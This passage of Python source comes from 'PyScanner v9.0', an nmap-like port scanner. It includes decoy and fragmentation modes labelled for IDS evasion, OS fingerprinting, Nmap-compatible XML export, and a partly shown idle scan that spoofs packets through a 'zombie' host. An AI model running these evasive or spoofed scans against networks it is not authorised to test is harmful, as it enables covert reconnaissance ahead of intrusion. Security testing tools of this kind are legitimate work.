        use_stateless = getattr(self.args, "stateless", False)
        use_decoys    = bool(getattr(self.args, "decoys",    None))
        use_fragment  = getattr(self.args, "fragment",  False)
        decoy_list    = getattr(self.args, "_decoy_ips", None)

        # ── Batch engines for SYN and stealth scan types ─────────────────
        if self.scan_type == "syn":
            if use_fragment:
                # [ENH-10] IP fragment mode (IDS evasion)
                batch_results = fragmented_syn_scan(
                    hr.ip, scan_order, self.timeout,
                    decoy_ips=decoy_list if use_decoys else None)
            elif use_decoys:
                # [ENH-9] Decoy mode (stealth / log confusion)
                batch_results = syn_scan_with_decoys(
                    hr.ip, scan_order, self.timeout,
                    decoy_ips=decoy_list,
                    stateless=use_stateless)
            elif use_stateless:
                # [ENH-8] Stateless mode (ZMap/Masscan architecture)
                batch_results = stateless_syn_scan(
                    hr.ip, scan_order, self.timeout)
            elif self._use_async:
                # [UPG-4] Async engine — faster for large port sets
                asc = AsyncSynScanner(get_local_ip(hr.ip),
                                      self.timeout, self._rtt)
                batch_results = asc.scan(hr.ip, scan_order)
            else:
                batch_results = syn_batch_scan(hr.ip, scan_order, self.timeout)

        elif self.scan_type in ("null", "fin", "xmas", "ack", "window"):
            # [UPG-3] Stealth scans — all use the shared stealth_scan engine
            flag_map = {
                "null":   0x00,
                "fin":    F_FIN,
                "xmas":   F_FIN | F_PSH | F_URG,
                "ack":    F_ACK,
                "window": F_ACK,
            }
            batch_results = stealth_scan(
                hr.ip, scan_order,
                flag_map[self.scan_type], self.timeout)

        if batch_results is not None:
            all_filtered = all(
                r.state in ("filtered", "open|filtered")
                and r.reason == "no-response"
                for r in batch_results.values())
            if not all_filtered or not batch_results:
                self._post_process_batch(hr, batch_results)
                return

        # ── Per-port worker pool (connect / UDP / fallback) ───────────────
        def worker(port: int) -> Optional[PortResult]:
            if self._stop:
                return None
            if getattr(self.args, "randomise", False):
                time.sleep(random.uniform(0.005, 0.05))
            try:
                r = self.scan_port(hr.ip, port)
                if r.state == "open":
                    self._enrich_port(hr.ip, r)
                return r
            except Exception as exc:
                with self._lock:
                    self._errors.append(f"Worker {hr.ip}:{port} -> {exc}")
                return PortResult(port=port, state="error", reason=str(exc))

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads) as ex:
            future_map = {ex.submit(worker, p): p for p in scan_order}
            for f in concurrent.futures.as_completed(future_map):
                try:
                    res = f.result()
                except Exception as exc:
                    with self._lock:
                        self._errors.append(f"Future error: {exc}")
                    continue
                if res is not None:
                    with self._lock:
                        hr.ports.append(res)

        hr.ports.sort(key=lambda x: x.port)
        hr.open_count = sum(1 for p in hr.ports if p.state == "open")

    def _post_process_batch(self, hr: HostResult,
                            batch_results: Dict[int, PortResult]) -> None:
        """
        Shared post-processing for batch scan results:
        banner/version probe, fingerprint signal harvest, plugin run.
        """
        for r in batch_results.values():
            if r.state == "open":
                self._enrich_port(hr.ip, r)

        # Harvest fingerprinting signals from first open SYN-ACK result
        for r in batch_results.values():
            if r.state == "open":
                if getattr(r, "_fp_tcp_window", 0):
                    hr.tcp_window = r._fp_tcp_window
                if getattr(r, "_fp_df_bit", False):
                    hr.df_bit = True
                if getattr(r, "_fp_has_tcp_options", False):
                    hr.has_tcp_options = True
                break

        with self._lock:
            hr.ports.extend(batch_results.values())
        hr.ports.sort(key=lambda x: x.port)
        hr.open_count = sum(1 for p in hr.ports if p.state == "open")

    def _enrich_port(self, ip: str, r: PortResult) -> None:
        """
        Run all enrichment on a single open PortResult:
        [UPG-1] service probe DB, [FIX-34] regex version, [UPG-2] plugins.
        """
        run_probes = getattr(self.args, "banner", False) or \
                     getattr(self.args, "scripts", False)
        if run_probes:
            # [UPG-1] Full probe database: sends protocol payloads, regex match
            version, banner = run_service_probe(ip, r.port, self.timeout)
            r.banner  = banner
            r.version = version or extract_service_version(banner)

        # [UPG-2] Run matching plugins
        if getattr(self.args, "scripts", False) and self._plugins:
            plugin_results = run_plugins(
                ip, r.port, r.protocol, self._plugins, self.timeout)
            # Store plugin results on the PortResult for reporting
            if not hasattr(r, "plugin_results"):
                r.plugin_results = []
            r.plugin_results.extend(plugin_results)

    def grab_http(self, hr: HostResult) -> None:
        open_nums = {p.port for p in hr.ports if p.state == "open"}
        for port, use_https in [(80, False), (443, True),
                                 (8080, False), (8443, True)]:
            if port in open_nums:
                hdrs = fetch_http_headers(
                    hr.ip, port, use_https, self.timeout)
                if hdrs:
                    hr.http_headers[str(port)] = hdrs

    def fingerprint(self, hr: HostResult) -> None:
        """
        [FIX-28] Heuristic scoring from SYN-ACK signals.
        [ENH-3]  Deep probe engine (T1-T7 + IE + ECN) when possible.

        Strategy:
          1. If an open port is found and deep-fp is enabled (-T3+), attempt
             OsProbeEngine which sends 10 specialised probes.
          2. Fall back to heuristic os_fingerprint() otherwise.
        """
        open_ports   = [p.port for p in hr.ports if p.state == "open"]
        closed_ports = [p.port for p in hr.ports if p.state == "closed"]

        # [ENH-3] Deep probe: needs ≥1 open and ≥1 closed port, and raw sockets
        deep_fp = getattr(self.args, "deep_fp", False) or \
                  getattr(self.args, "timing", 3) >= 3

        if deep_fp and open_ports and closed_ports:
            try:
                engine = OsProbeEngine(
                    ip          = hr.ip,
                    open_port   = open_ports[0],
                    closed_port = closed_ports[0],
                    timeout     = min(self.timeout * 2, 4.0),
                )
                obs, guess = engine.probe()
                if guess and guess != "Unknown (no raw socket)":
                    hr.os_guess = guess
                    # Merge deep observations back for display
                    if obs.isn_class != "unknown":
                        hr.os_guess += (f" | ISN={obs.isn_class}"
                                        f" IPID={obs.ipid_class}")
                    return
            except Exception:
                pass  # fall through to heuristic

        # Heuristic fallback
        hr.os_guess = os_fingerprint(
            hr.ip, open_ports, hr.ttl,
            tcp_window      = getattr(hr, "tcp_window",      0),
            has_tcp_options = getattr(hr, "has_tcp_options", False),
            df_bit          = getattr(hr, "df_bit",          False),
        )

    def whois_lookup(self, hr: HostResult) -> None:
        hr.whois_info = do_whois(hr.ip)

    def run_traceroute(self, ip: str) -> List[Dict]:
        return traceroute(ip, max_hops=self.args.max_hops,
                          timeout=self.timeout)

    def run(self) -> ScanSummary:
        t0       = time.time()
        start_ts = now_str()
        cmd      = " ".join(sys.argv)

        # [ENH-6] Resume from checkpoint if requested
        checkpoint_path = getattr(self.args, "checkpoint", None) or ""
        resume_path     = getattr(self.args, "resume",     None) or ""
        resumed_results: List[HostResult] = []

        if resume_path and os.path.exists(resume_path):
            remaining_targets, resumed_results = ScanCheckpoint.load(resume_path)
            # Override targets with remaining ones
            self.args.targets = remaining_targets or self.args.targets
            checkpoint_path   = resume_path  # continue writing to same file

        targets = self.resolve_targets()

        if not targets and not resumed_results:
            print(color("[!] No valid targets.", RED))
            sys.exit(1)

        ports = parse_ports(self.args.ports) if self.args.ports else []

        print(color(
            f"\nPyScanner v9.0 — starting scan at {start_ts}", BOLD))
        print(color(f"Targets  : {len(targets)}", CYAN))
        if ports:
            print(color(f"Ports    : {len(ports)}  ({self.args.ports})",
                        CYAN))
        print(color(f"Scan type: {self.scan_type}", CYAN))
        if resumed_results:
            print(color(f"Resumed  : {len(resumed_results)} hosts from checkpoint",
                        CYAN))
        print()

        # [ENH-6] Initialise checkpoint writer
        checkpoint: Optional[ScanCheckpoint] = None
        if checkpoint_path:
            checkpoint = ScanCheckpoint(checkpoint_path,
                                        targets=targets or [])
            print(color(f"[*] Checkpointing to: {checkpoint_path}", CYAN))

        host_results: List[HostResult] = list(resumed_results)

        # ── Host discovery ───────────────────────────────────────────
        if targets:
            print(color("[*] Host discovery...", YELLOW))
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=self.threads) as ex:
                pfutures = {
                    ex.submit(self.ping_host, ip): ip for ip in targets}
                for f in concurrent.futures.as_completed(pfutures):
                    try:
                        hr = f.result()
                    except Exception as exc:
                        ip = pfutures[f]
                        print(color(
                            f"  [!] ping_host({ip}) error: {exc}", RED))
                        hr = HostResult(ip=ip)
                    host_results.append(hr)
                    sc = GREEN if hr.status == "up" else DIM
                    ls = f" ({hr.latency_ms}ms)" if hr.latency_ms else ""
                    hs = hr.ip + (f" ({hr.hostname})" if hr.hostname else "")
                    print(f"  {color(hr.status.upper(), sc):20s} {hs}{ls}")

        try:
            host_results.sort(key=lambda h: socket.inet_aton(h.ip))
        except Exception:
            pass   # IPv6 addresses can't use inet_aton
        up_hosts = [h for h in host_results if h.status == "up"]
        print(color(
            f"\n[*] {len(up_hosts)}/{len(host_results)} hosts up.\n",
            YELLOW))

        # ── Port scan ────────────────────────────────────────────────
        if ports and up_hosts:
            print(color("[*] Port scanning...", YELLOW))
            total_work = len(up_hosts) * len(ports)

            # [ENH-5] Progress tracker across all hosts
            progress = ProgressTracker(
                total=total_work,
                label=f"({len(up_hosts)} hosts)")

            for hr in up_hosts:
                if self._stop:
                    break
                lbl = (f"{hr.ip} ({hr.hostname})"
                       if hr.hostname else hr.ip)
                print(color(f"\n  Scanning {lbl} ...", CYAN))

                # Monkey-patch scan_port to drive progress bar
                orig_scan_port = self.scan_port
                def _tracked_scan_port(ip, port,
                                       _orig=orig_scan_port,
                                       _prog=progress) -> PortResult:
                    result = _orig(ip, port)
                    _prog.update(1, is_open=(result.state == "open"))
                    return result
                self.scan_port = _tracked_scan_port  # type: ignore

                self.scan_ports(hr, ports)
                self.scan_port = orig_scan_port       # restore

                self.fingerprint(hr)
                if self.args.http_headers:
                    self.grab_http(hr)
                if self.args.whois:
                    self.whois_lookup(hr)

                # [ENH-6] Save host to checkpoint before printing
                if checkpoint:
                    checkpoint.save_host(hr)

                self._print_host_result(hr)

            progress.finish()

        # ── Traceroute ───────────────────────────────────────────────
        if self.args.traceroute and up_hosts:
            for hr in up_hosts[:3]:
                print(color(f"\n[*] Traceroute to {hr.ip}", YELLOW))
                hops = self.run_traceroute(hr.ip)
                self._print_traceroute(hops)

        # ── ARP scan ─────────────────────────────────────────────────
        if self.args.arp_scan:
            for t in self.args.targets:
                if "/" in t:
                    print(color(f"\n[*] ARP scan on {t}", YELLOW))
                    arp_res = arp_scan(t, self.timeout)
                    if not arp_res:
                        print(color(
                            "  No hosts found (or insufficient privileges).",
                            DIM))
                    for entry in arp_res:
                        print(f"  {color(entry['ip'], GREEN)}"
                              f"  MAC: {entry['mac']}")

        if self._errors and self.args.verbose:
            print(color("\n[!] Worker errors:", YELLOW))
            for e in self._errors[:20]:
                print(color(f"    {e}", DIM))

        elapsed_s  = elapsed(t0)
        end_ts     = now_str()
        open_ports = sum(h.open_count for h in host_results)

        summary = ScanSummary(
            command=cmd,
            start_time=start_ts,
            end_time=end_ts,
            elapsed_sec=elapsed_s,
            total_hosts=len(targets),
            hosts_up=len(up_hosts),
            hosts_down=len(targets) - len(up_hosts),
            total_ports_scanned=len(ports) * len(up_hosts),
            open_ports=open_ports,
            results=host_results,
        )
        self._print_summary(summary)
        self.results = host_results
        return summary

    # ─────────────────────────────────────────
    # Pretty Printers
    # ─────────────────────────────────────────

    def _print_host_result(self, hr: HostResult) -> None:
        open_ports     = [p for p in hr.ports if p.state == "open"]
        closed_count   = sum(1 for p in hr.ports if p.state == "closed")
        filtered_count = sum(1 for p in hr.ports if "filtered" in p.state)

        print(f"  OS guess : {color(hr.os_guess or 'Unknown', MAGENTA)}")
        print(f"  Open: {color(str(len(open_ports)), GREEN)}"
              f"  Closed: {closed_count}"
              f"  Filtered: {filtered_count}")

        if not open_ports:
            print(color("  No open ports found.", DIM))
            return

        # ── Port table with version column ────────────────────────────────
        hdr = (f"  {'PORT':<10} {'PROTO':<6} {'STATE':<14}"
               f" {'SERVICE':<14} {'VERSION':<28} BANNER")
        print(color(hdr, BOLD))
        print("  " + "─" * 90)
        for p in open_ports:
            ver = (p.version[:26] + "..") if len(p.version) > 28 else p.version
            bs  = (p.banner[:28] + "..") if len(p.banner) > 30 else p.banner
            # Strip newlines from banner for table display
            bs = bs.replace("\n", " ").replace("\r", "")
            print(f"  {p.port:<10} {p.protocol:<6}"
                  f" {color(p.state, GREEN):<22}"
                  f" {p.service:<14}"
                  f" {color(ver, CYAN):<36}"
                  f" {color(bs, DIM)}")

            # [UPG-2] Print plugin results indented under the port line
            for pr in getattr(p, "plugin_results", []):
                plug_label = color(f"  [{pr.plugin}]", MAGENTA)
                # Multi-line plugin output — indent each line
                for line in pr.output.splitlines():
                    print(f"        {plug_label} {line}")
                    plug_label = " " * (len(pr.plugin) + 4)

        if self.args.verbose:
            for p in hr.ports:
                if p.state == "open":
                    continue
                sc = YELLOW if "filtered" in p.state else DIM
                print(f"  {p.port:<10} {p.protocol:<6}"
                      f" {color(p.state, sc):<22}"
                      f" {p.service:<14}"
                      f" {color(p.reason, DIM)}")

        if hr.http_headers:
            print(color("\n  HTTP Headers:", YELLOW))
            for port_str, hdrs in hr.http_headers.items():
                print(f"    Port {port_str}:")
                for k, v in list(hdrs.items())[:12]:
                    print(f"      {k}: {v}")

        if hr.whois_info:
            print(color("\n  Whois (truncated):", YELLOW))
            for line in hr.whois_info.splitlines()[:15]:
                if line.strip():
                    print(f"    {line}")

    def _print_traceroute(self, hops: List[Dict]) -> None:
        print(f"  {'HOP':<5} {'IP':<18} {'HOSTNAME':<35} RTT")
        print("  " + "─" * 65)
        for h in hops:
            rtt = (f"{h['rtt_ms']}ms"
                   if h["rtt_ms"] is not None else "*")
            hn = h["hostname"] \
                if h["hostname"] not in ("*", h["ip"]) else ""
            print(f"  {h['ttl']:<5} {h['ip']:<18} {hn:<35} {rtt}")

    def _print_summary(self, s: ScanSummary) -> None:
        print(color("\n" + "=" * 62, BOLD))
        print(color("  PyScanner v9.0 - Scan Summary", BOLD))
        print(color("=" * 62, BOLD))
        print(f"  Start    : {s.start_time}")
        print(f"  End      : {s.end_time}")
        print(f"  Duration : {s.elapsed_sec}s")
        print(f"  Hosts    : {color(str(s.hosts_up), GREEN)} up / "
              f"{color(str(s.hosts_down), DIM)} down / "
              f"{s.total_hosts} total")
        print(f"  Ports    : {color(str(s.open_ports), GREEN)} open"
              f" / {s.total_ports_scanned} scanned")
        if self._errors:
            print(color(
                f"  Errors   : {len(self._errors)} (use -v to see)",
                YELLOW))
        print(color("=" * 62 + "\n", BOLD))


# ─────────────────────────────────────────────
# Report Export
# ─────────────────────────────────────────────

def export_json(summary: ScanSummary, path: str) -> None:
    def _default(obj):
        if hasattr(obj, "__dict__"):
            return obj.__dict__
        return str(obj)
    data = {
        "scanner":     "PyScanner v9.0",
        "command":     summary.command,
        "start_time":  summary.start_time,
        "end_time":    summary.end_time,
        "elapsed_sec": summary.elapsed_sec,
        "stats": {
            "hosts_up":   summary.hosts_up,
            "hosts_down": summary.results_down,
            "open_ports": summary.open_ports,
        },
        "hosts": [asdict(h) for h in summary.results],
    }
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=_default)
    print(color(f"[+] JSON report -> {path}", GREEN))


def export_text(summary: ScanSummary, path: str) -> None:
    lines = [
        "PyScanner v9.0 Report",
        "=" * 62,
        f"Command : {summary.command}",
        f"Start   : {summary.start_time}",
        f"End     : {summary.end_time}",
        f"Elapsed : {summary.elapsed_sec}s",
        f"Hosts up: {summary.hosts_up}/{summary.total_hosts}",
        f"Open ports: {summary.open_ports}",
        "",
    ]
    for hr in summary.results:
        lines.append(f"Host: {hr.ip}"
                     + (f" ({hr.hostname})" if hr.hostname else ""))
        lines.append(f"  Status  : {hr.status}")
        lines.append(f"  OS      : {hr.os_guess}")
        lines.append(f"  Latency : {hr.latency_ms}ms")
        if hr.ports:
            lines.append(
                f"  {'PORT':<10} {'PROTO':<6} {'STATE':<14}"
                f" {'SERVICE':<16} BANNER")
            for p in sorted(hr.ports, key=lambda x: x.port):
                lines.append(
                    f"  {p.port:<10} {p.protocol:<6}"
                    f" {p.state:<14} {p.service:<16} {p.banner}")
        lines.append("")
    with open(path, "w") as f:
        f.write("\n".join(lines))
    print(color(f"[+] Text report -> {path}", GREEN))


# ─────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════
# [V9-5] NMAP-COMPATIBLE XML EXPORT + CSV EXPORT
# ═══════════════════════════════════════════════════════════════════

import xml.etree.ElementTree as ET


def export_xml(summary: ScanSummary, path: str) -> None:
    """
    [V9-5] Export scan results as Nmap-compatible XML.

    Schema matches Nmap's output format so tools like Metasploit,
    Armitage, Nessus, and BloodHound can import it directly.

    Key elements: <nmaprun> → <host> → <ports> → <port> → <service>
    """
    root = ET.Element("nmaprun")
    root.set("scanner",    "pyscanner")
    root.set("version",    "9.0")
    root.set("start",      str(int(time.time())))
    root.set("startstr",   summary.start_time)
    root.set("args",       summary.command)
    root.set("xmloutputversion", "1.04")

    # <scaninfo>
    si = ET.SubElement(root, "scaninfo")
    si.set("type",      "syn")
    si.set("protocol",  "tcp")
    si.set("numservices", str(sum(len(h.ports) for h in summary.results)))
    si.set("services",  "")

    # One <host> per HostResult
    for hr in summary.results:
        host_el = ET.SubElement(root, "host")

        # <status>
        st = ET.SubElement(host_el, "status")
        st.set("state",  hr.status)
        st.set("reason", "user-set" if hr.status == "up" else "no-response")

        # <address>
        addr = ET.SubElement(host_el, "address")
        addr.set("addr",     hr.ip)
        addr.set("addrtype", "ipv6" if is_ipv6(hr.ip) else "ipv4")

        # <hostnames>
        hnames = ET.SubElement(host_el, "hostnames")
        if hr.hostname:
            hn = ET.SubElement(hnames, "hostname")
            hn.set("name", hr.hostname)
            hn.set("type", "PTR")

        # <ports>
        ports_el = ET.SubElement(host_el, "ports")
        for p in hr.ports:
            port_el = ET.SubElement(ports_el, "port")
            port_el.set("protocol", p.protocol)
            port_el.set("portid",   str(p.port))

            state_el = ET.SubElement(port_el, "state")
            state_el.set("state",  p.state)
            state_el.set("reason", p.reason)

            svc_el = ET.SubElement(port_el, "service")
            svc_el.set("name",    p.service)
            svc_el.set("product", p.version.split(" ")[0] if p.version else "")
            svc_el.set("version", " ".join(p.version.split(" ")[1:])
                       if p.version and " " in p.version else p.version)
            svc_el.set("extrainfo", p.banner[:80] if p.banner else "")

            # Plugin output as <script> elements
            for pr in getattr(p, "plugin_results", []):
                sc = ET.SubElement(port_el, "script")
                sc.set("id",     pr.plugin)
                sc.set("output", pr.output)

        # <os> block
        if hr.os_guess:
            os_el = ET.SubElement(host_el, "os")
            osm   = ET.SubElement(os_el, "osmatch")
            osm.set("name",     hr.os_guess)
            osm.set("accuracy", "75")

        # <times>
        times_el = ET.SubElement(host_el, "times")
        times_el.set("rttvar", "0")
        times_el.set("srtt",   str(int(hr.latency_ms * 1000)))
        times_el.set("to",     "1000000")

    # <runstats>
    rs = ET.SubElement(root, "runstats")
    fin = ET.SubElement(rs, "finished")
    fin.set("time",    str(int(time.time())))
    fin.set("elapsed", str(elapsed(0)))
    hosts_el = ET.SubElement(rs, "hosts")
    hosts_el.set("up",    str(summary.hosts_up))
    hosts_el.set("down",  str(summary.total_hosts - summary.hosts_up))
    hosts_el.set("total", str(summary.total_hosts))

    # Pretty-print with indentation
    _indent_xml(root)
    tree = ET.ElementTree(root)
    with open(path, "wb") as f:
        f.write(b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b'<!DOCTYPE nmaprun>\n')
        tree.write(f, encoding="UTF-8", xml_declaration=False)
    print(color(f"[+] XML report  → {path}  (Nmap-compatible)", GREEN))


def _indent_xml(elem: ET.Element, level: int = 0) -> None:
    """Add pretty-print indentation to an ElementTree in place."""
    indent = "\n" + "  " * level
    if len(elem):
        if not elem.text or not elem.text.strip():
            elem.text = indent + "  "
        if not elem.tail or not elem.tail.strip():
            elem.tail = indent
        for child in elem:
            _indent_xml(child, level + 1)
        if not child.tail or not child.tail.strip():
            child.tail = indent
    else:
        if level and (not elem.tail or not elem.tail.strip()):
            elem.tail = indent


def export_csv(summary: ScanSummary, path: str) -> None:
    """
    [V9-5] Export scan results as flat CSV suitable for spreadsheets.

    Columns: ip, hostname, status, os_guess, latency_ms,
             port, protocol, state, service, version, banner, reason
    """
    import csv as _csv
    COLS = ["ip", "hostname", "status", "os_guess", "latency_ms",
            "port", "protocol", "state", "service", "version",
            "banner", "reason"]
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = _csv.writer(f)
        writer.writerow(COLS)
        for hr in summary.results:
            if not hr.ports:
                writer.writerow([
                    hr.ip, hr.hostname, hr.status, hr.os_guess,
                    hr.latency_ms, "", "", "", "", "", "", ""])
            else:
                for p in hr.ports:
                    writer.writerow([
                        hr.ip, hr.hostname, hr.status, hr.os_guess,
                        hr.latency_ms,
                        p.port, p.protocol, p.state,
                        p.service, p.version,
                        p.banner.replace("\n", " ")[:80],
                        p.reason,
                    ])
    print(color(f"[+] CSV report  → {path}", GREEN))


# ═══════════════════════════════════════════════════════════════════
# [V9-6] NETWORK TOPOLOGY ANALYZER
# ═══════════════════════════════════════════════════════════════════

class TopologyAnalyzer:
    """
    [V9-6] Analyze and visualize the network topology from scan results.

    Groups hosts by /24 subnet, identifies likely gateways (TTL=1 hop,
    low ports like 22/80/443, .1/.254 addresses), ranks hosts by open
    port count, and prints an ASCII tree.

    Example output:
      Network Topology (/24 subnets)
      ├── 192.168.1.0/24  (4 hosts, 12 open ports)
      │   ├── 192.168.1.1   [GATEWAY]  open:3  os:Cisco IOS
      │   ├── 192.168.1.10  open:5  os:Linux 5.x
      │   └── 192.168.1.100 open:1  os:Windows 10
      └── 10.0.0.0/24  (1 host, 2 open ports)
          └── 10.0.0.1  [GATEWAY]  open:2
    """

    def __init__(self, hosts: List[HostResult]):
        self.hosts = [h for h in hosts if h.status == "up"]

    def analyze(self) -> Dict[str, Any]:
        """Return structured topology dict."""
        subnets: Dict[str, List[HostResult]] = {}

        for h in self.hosts:
            subnet = self._subnet_key(h.ip)
            subnets.setdefault(subnet, []).append(h)

        topology: Dict[str, Any] = {}
        for subnet, subnet_hosts in sorted(subnets.items()):
            total_open = sum(h.open_count for h in subnet_hosts)
            gateways   = [h for h in subnet_hosts
                          if self._is_likely_gateway(h)]
            ranked     = sorted(subnet_hosts,
                                key=lambda h: h.open_count, reverse=True)
            topology[subnet] = {
                "hosts":       ranked,
                "total_open":  total_open,
                "gateways":    gateways,
                "host_count":  len(subnet_hosts),
            }

        return {
            "subnets":     topology,
            "total_hosts": len(self.hosts),
            "total_open":  sum(h.open_count for h in self.hosts),
            "most_open":   sorted(self.hosts,
                                  key=lambda h: h.open_count,
                                  reverse=True)[:5],
        }

    def _subnet_key(self, ip: str) -> str:
        """Return /24 subnet string for an IPv4, or ip itself for IPv6."""
        if is_ipv6(ip):
            return ip
        try:
            parts = ip.split(".")
            return f"{'.'.join(parts[:3])}.0/24"
        except Exception:
            return ip

    def _is_likely_gateway(self, h: HostResult) -> bool:
        """Heuristic: .1 or .254 address, or running routing services."""
        try:
            last_octet = int(h.ip.split(".")[-1])
            if last_octet in (1, 254):
                return True
        except Exception:
            pass
        open_ports = {p.port for p in h.ports if p.state == "open"}
        gateway_ports = {80, 443, 22, 23, 161, 179, 520, 4786}
        return len(open_ports & gateway_ports) >= 2

    def print_tree(self) -> None:
        """Print ASCII network topology tree to stdout."""
        topo = self.analyze()
        print(color(
            f"\n{'─'*60}\n"
            f"  Network Topology  ({topo['total_hosts']} hosts up, "
            f"{topo['total_open']} open ports)\n"
            f"{'─'*60}", BOLD))

        subnets = topo["subnets"]
        subnet_keys = sorted(subnets.keys())

        for si, subnet in enumerate(subnet_keys):
            is_last_subnet = (si == len(subnet_keys) - 1)
            branch = "└──" if is_last_subnet else "├──"
            info   = subnets[subnet]
            print(f"  {color(branch, CYAN)} "
                  f"{color(subnet, BOLD)}  "
                  f"({info['host_count']} hosts, "
                  f"{info['total_open']} open ports)")

            hosts  = info["hosts"]
            for hi, h in enumerate(hosts):
                is_last = (hi == len(hosts) - 1)
                connector = "│   " if not is_last_subnet else "    "
                hbranch   = "└──" if is_last else "├──"
                gw_tag    = color(" [GATEWAY]", YELLOW) \
                            if self._is_likely_gateway(h) else ""
                os_short  = ""
                if h.os_guess and h.os_guess != "Unknown":
                    # Shorten: "Linux 5.x/6.x (confidence: high, score: 9.5)"
                    # → "Linux 5.x"
                    os_short = color(
                        "  os:" + h.os_guess.split("(")[0].strip()[:20],
                        DIM)
                open_ports = [p.port for p in h.ports if p.state == "open"]
                ports_str  = (",".join(str(p) for p in open_ports[:6])
                              + ("…" if len(open_ports) > 6 else ""))
                lat = f"  {h.latency_ms}ms" if h.latency_ms else ""
                hostname   = f" ({h.hostname})" if h.hostname else ""

                print(f"  {connector}{hbranch} "
                      f"{color(h.ip, GREEN)}{hostname}"
                      f"{gw_tag}"
                      f"  open:{h.open_count}"
                      f"  [{ports_str}]"
                      f"{os_short}"
                      f"{color(lat, DIM)}")

        # Top 5 most exposed hosts
        most_open = topo["most_open"]
        if most_open:
            print(color(f"\n  Top {len(most_open)} most exposed hosts:", YELLOW))
            for i, h in enumerate(most_open, 1):
                print(f"    {i}. {color(h.ip, GREEN)}"
                      f"  open:{h.open_count}")
        print()


# ─────────────────────────────────────────────
# Report Export
# ─────────────────────────────────────────────
# ─────────────────────────────────────────────

BANNER_ART = r"""
  ____        ____
 |  _ \ _   _/ ___|  ___ __ _ _ __  _ __   ___ _ __
 | |_) | | | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 |  __/| |_| |___) | (_| (_| | | | | | | |  __/ |
 |_|    \__, |____/ \___\__,_|_| |_|_| |_|\___|_|
        |___/                    v9.0  (nmap-like)
"""

TOP_100_PORTS = (
    "7,9,13,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,"
    "119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,"
    "515,543,544,548,554,587,631,646,873,990,993,995,1025,1026,1027,"
    "1028,1029,1110,1433,1720,1723,1755,1900,2000,2001,2049,2121,"
    "2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,"
    "5190,5357,5432,5631,5666,5800,5900,6000,6001,6646,7070,8000,"
    "8008,8009,8080,8081,8443,8888,9100,9999,10000,32768,49152,49153,"
    "49154,49155,49156,49157"
)


# ═══════════════════════════════════════════════════════════════════
# [ENH-12] IDLE SCAN (Zombie scan)  — Nmap -sI equivalent
# ═══════════════════════════════════════════════════════════════════
#
# The idle scan exploits predictable IP ID sequences in "zombie" hosts.
# It is completely blind from the scanner's perspective — the target
# never sees a packet from our real IP.
#
# Algorithm (3 steps per port):
#   1. Probe zombie: send SYN/ACK → get RST, record IP ID = id1
#   2. Spoof SYN to target from zombie's IP → target replies to zombie
#      • If port OPEN:  target→zombie SYN-ACK → zombie RST (IP ID++)
#      • If port CLOSED: target→zombie RST    → zombie ignores (no++)
#   3. Probe zombie again → get RST, record IP ID = id2
#      • id2 - id1 == 2  → port OPEN   (zombie got SYN-ACK from target)
#      • id2 - id1 == 1  → port CLOSED (zombie got RST or nothing)
#
# Requirement: zombie must have a globally incrementing, predictable
# IP ID sequence (many older Windows/embedded devices qualify).
# ═══════════════════════════════════════════════════════════════════

def _probe_zombie_ipid(zombie_ip: str, timeout: float = 2.0) -> Optional[int]:
    """
    [ENH-12] Send a SYN/ACK to zombie to elicit RST and read IP ID.
    Returns the IP ID from the zombie's RST packet, or None on failure.
    """
    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.settimeout(timeout)
    except (PermissionError, OSError):
        return None

    src_ip   = get_local_ip(zombie_ip)
    src_port = random.randint(32768, 60999)

    # Send SYN/ACK to zombie on a random port — zombie replies with RST
    try:
        # Build SYN-ACK (flags=0x12) with random seq/ack
        ip_src  = socket.inet_aton(src_ip)
        ip_dst  = socket.inet_aton(zombie_ip)
        seq     = random.randint(0, 0xFFFFFFFF)
        ack     = random.randint(0, 0xFFFFFFFF)
        dst_port = 80

        th_off_res = (5 << 4)
        tcp_nc = struct.pack("!HHLLBBHHH",
            src_port, dst_port, seq, ack,
            th_off_res, 0x12, 65535, 0, 0)
        pseudo = struct.pack("!4s4sBBH", ip_src, ip_dst, 0, socket.IPPROTO_TCP, 20)
        tcp_chk = checksum(pseudo + tcp_nc)
        tcp_hdr = struct.pack("!HHLLBBHHH",
            src_port, dst_port, seq, ack,
            th_off_res, 0x12, 65535, tcp_chk, 0)

        ttl     = random.choice([64, 128])
        ip_id   = random.randint(0, 0xFFFF)
        total   = 40
        ip_nc   = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total, ip_id, 0, ttl, socket.IPPROTO_TCP, 0, ip_src, ip_dst)
        ip_chk  = checksum(ip_nc)
        ip_hdr  = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total, ip_id, 0, ttl, socket.IPPROTO_TCP, ip_chk, ip_src, ip_dst)

        send_sock.sendto(ip_hdr + tcp_hdr, (zombie_ip, 0))

        # Read zombie's RST and extract its IP ID
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                break
            if addr[0] != zombie_ip or len(data) < 40:
                continue
            if data[9] != socket.IPPROTO_TCP:
                continue
            ihl   = (data[0] & 0x0F) * 4
            flags = data[ihl + 13]
            if flags & 0x04:  # RST
                z_ipid = struct.unpack("!H", data[4:6])[0]
                return z_ipid
    except OSError:
        pass
    finally:
        send_sock.close()
        recv_sock.close()
    return None


def _check_zombie_predictability(zombie_ip: str, samples: int = 5,
                                  timeout: float = 1.0) -> Tuple[bool, str]:
    """
    [ENH-12] Verify the zombie has a predictable (incrementing) IP ID.
    Returns (is_suitable, reason_string).
    """
    ids = []
    for _ in range(samples):
        ipid = _probe_zombie_ipid(zombie_ip, timeout)
        if ipid is None:
            return False, "zombie not responding"
        ids.append(ipid)
